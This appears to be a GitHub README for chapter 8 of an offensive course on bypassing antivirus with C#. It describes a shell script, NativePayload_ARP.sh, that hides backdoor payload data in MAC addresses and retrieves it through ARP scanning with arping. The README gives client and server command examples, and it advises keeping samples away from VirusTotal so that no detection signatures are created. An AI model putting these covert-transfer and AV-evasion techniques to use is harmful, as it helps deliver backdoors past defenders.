# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 8 : Transferring Backdoor Payloads by ARP Traffic

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 8 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH8

Related Video : 

Video 1 C# Code : https://youtu.be/qDLicXj7Vuk

Video 2 (Linux only) Script Code : https://www.youtube.com/watch?v=O-llNZ9S8Mo



Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .

# NativePayload_ARP.sh  help :

Example Step1: (Client Side ) ./NativePayload_ARP.sh -s text-file eth0 delay x"

Example Step2: (Server Side ) ./NativePayload_ARP.sh -a vboxnet target-IPv4 "

example (IPv4 : 192.168.56.101) : ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3"

example (IPv4 : 192.168.56.1) : ./NativePayload_DNS2.sh -a vboxnet 192.168.56.101 "

Description: with Step1 you will inject Data to MAC address for eth0 , with Step2 you can have this text file via Scanning target-system by ARP traffic (Using Arping tool)"

# Note : "NativePayload_ARP.sh" tested by (arping utility, iputils-s20161105 and kali linux 2018.2)

# Note : yeah if you want to use "vboxnet" , it means you will have one bridge between Virtual Machine to Physical Machine ;) lol 

![](https://github.com/DamonMohammadbagher/NativePayload_ARP/blob/master/Chapter%208%20-%20Transferring%20Backdoor%20Payloads%20by%20ARP%20Traffic/x1.png)


![](https://github.com/DamonMohammadbagher/NativePayload_ARP/blob/master/Chapter%208%20-%20Transferring%20Backdoor%20Payloads%20by%20ARP%20Traffic/x2.png)
